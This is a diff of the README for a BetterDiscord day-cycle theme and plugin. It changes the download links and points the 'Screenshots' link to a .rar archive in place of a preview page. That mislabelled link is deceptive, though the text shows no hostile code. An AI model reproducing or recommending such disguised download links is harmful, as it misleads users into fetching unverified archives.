@@ -2,7 +2,7 @@
 
 Download: <a href="https://github.com/v37ga/DayCycleDiscord/blob/main/src/CozyForestTheme.rar?raw=true">[here]</a>
 <br>
-Screenshots: <a href="https://github.com/v37ga/DayCycleDiscord/blob/main/preview.md">[here]</a>
+Screenshots: <a href="https://github.com/v37ga/DayCycleDiscord/blob/main/download/Day%20Cycle%20Discord%201.3.0.rar?raw=true">[here]</a>
 
 ig: <a href="http://instagram.com/fabio.veiga_">@fabio.veiga_</a><br>
 Changes the background of your discord based on what time is it.
@@ -10,7 +10,7 @@ Changes the background of your discord based on what time is it.
 ![daycycle](https://user-images.githubusercontent.com/71238693/135930659-73bd1437-4d9e-45fc-874f-e57175ddedd8.png)
 # Installation
 1. <a href="https://betterdiscord.app/">Download and install betterdiscord.</a>
-2. <a href="https://github.com/v37ga/DayCycleDiscord/blob/main/src/CozyForestTheme.rar?raw=true">Download DayCycleDiscord.</a>
+2. <a href="https://github.com/v37ga/DayCycleDiscord/blob/main/download/Day%20Cycle%20Discord%201.3.0.rar?raw=true">Download DayCycleDiscord.</a>
 3. Place the file 'DayCycleDiscord.theme.css' in the betterdiscord's theme folder.
 4. Place the file 'DayCycleDiscord.plugin.js' in the betterdiscord's plugin folder.
 5. Activate the plugin in betterdiscord config.
